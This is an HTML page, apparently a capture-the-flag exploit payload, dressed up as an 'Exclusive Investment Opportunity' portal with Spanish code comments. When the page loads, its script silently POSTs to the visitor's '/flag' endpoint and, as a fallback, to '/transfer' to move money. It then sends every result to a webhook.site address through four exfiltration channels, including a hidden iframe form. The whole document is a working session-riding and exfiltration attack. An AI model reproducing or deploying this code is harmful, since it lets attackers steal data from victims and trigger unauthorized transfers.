<!DOCTYPE html>
<html>
<head>
    <title>Exclusive Investment Opportunity</title>
</head>
<body>
    <h1>Secure Investment Portal</h1>
    <div id="status">Initializing secure connection...</div>

    <script>
        // Webhook - VERIFICA QUE ESTÉ CORRECTO
        const WEBHOOK = "https://webhook.site/b4cd18d9-c61a-4a6c-b21a-e4e66153f385";
        
        // Función para enviar datos
        function exfiltrate(data) {
            console.log("Exfiltrating:", data);
            
            // Método 1: Image (más confiable)
            var img1 = new Image();
            img1.src = WEBHOOK + "?method=img1&data=" + encodeURIComponent(data.substring(0, 1000));
            
            // Método 2: Fetch
            fetch(WEBHOOK, {
                method: 'POST',
                mode: 'no-cors',
                headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                body: 'data=' + encodeURIComponent(data)
            }).catch(e => console.log("Fetch error"));
            
            // Método 3: Navigator.sendBeacon
            if (navigator.sendBeacon) {
                navigator.sendBeacon(WEBHOOK, 'data=' + encodeURIComponent(data));
            }
            
            // Método 4: Form submission
            var form = document.createElement('form');
            form.method = 'POST';
            form.action = WEBHOOK;
            form.target = 'hiddenFrame';
            var input = document.createElement('input');
            input.name = 'data';
            input.value = data;
            form.appendChild(input);
            document.body.appendChild(form);
            
            var iframe = document.createElement('iframe');
            iframe.name = 'hiddenFrame';
            iframe.style.display = 'none';
            document.body.appendChild(iframe);
            
            form.submit();
        }

        // Función post del banco
        function post(url, params={}){
            var params_post = [];
            for(const key in params){
                params_post.push(`${key}=${params[key]}`);
            }
            var xhr = new XMLHttpRequest();
            xhr.open("POST", url, false);
            xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
            xhr.send(params_post.join("&"));
            return xhr.responseText;
        }

        // Ejecutar cuando cargue la página
        window.onload = function() {
            document.getElementById('status').textContent = "Checking authentication...";
            exfiltrate("Page loaded successfully");
            
            setTimeout(function() {
                try {
                    document.getElementById('status').textContent = "Accessing privileged data...";
                    
                    // Intentar obtener la flag
                    var flag = post("/flag");
                    exfiltrate("SUCCESS - Flag: " + flag);
                    document.getElementById('status').textContent = "Data retrieved successfully!";
                    
                } catch(error) {
                    exfiltrate("ERROR accessing /flag: " + error.toString());
                    
                    // Intentar transferencia como fallback
                    try {
                        var transfer = post("/transfer", {
                            recipient: "a", 
                            amount: "100"
                        });
                        exfiltrate("Transfer result: " + transfer);
                    } catch(e) {
                        exfiltrate("Transfer error: " + e.toString());
                    }
                }
            }, 1000);
        };
    </script>
</body>
</html>
